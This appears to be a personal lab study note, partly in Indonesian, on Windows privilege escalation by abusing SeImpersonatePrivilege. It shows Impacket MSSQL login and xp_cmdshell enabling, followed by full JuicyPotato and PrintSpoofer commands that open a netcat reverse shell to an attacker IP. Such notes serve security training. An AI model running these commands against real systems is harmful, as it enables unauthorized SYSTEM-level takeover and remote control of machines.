# 1. Windows User Privilege Escalation - SeImpersonate & SeassignPrimary Token

Status: Not started

1. **SeImpersonate Example - JuicyPotato**

command to detect  :  `whoami /priv`
output yang vulnerable :
`SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled`

Exploit Skema :

Using Impacket 

[`MSsqlclient.pymssqlclient.py](http://mssqlclient.py/) [sql_dev@10.129.43.30](mailto:sql_dev@10.129.43.30) -windows-auth == > login ke shell mssql
enable_xp_cmdshell ==> akses CMD lewat xp_cmd_shell`

`Konfirmasi Akses :
xp_cmdshell whoami
xp_cmdshell whoami /priv`

**PRIVILEGES INFORMATION**

---

`Privilege Name                Description                               State`

`============================= ========================================= ========`

`SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled`

`SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled`

`SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled`

`SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled`

`SeImpersonatePrivilege        Impersonate a client after authentication Enabled`

`SeCreateGlobalPrivilege       Create global objects                     Enabled`

`SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled`

**Escalating Privileges Using JuicyPotato**

`xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *`

> JUICY POTATO TIDAK BEKERJA PADA WINDOWS SERVER 2019 DAN WINDOWS 10 BUILD 1809 DAN DIATAS NYA. ALTERNATIF NYA MENGGUNAKAN ROGGUEPOTATO & PRINTSPOOFER
> 

Escalating Priviledges Using PrintSpoofer
Download Url : [this url](https://github.com/itm4n/PrintSpoofer)

Command :
Langsung privesc : `PrintSpoofer.exe -i -c cmd`
Reverse Shell Privesc :`PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"`
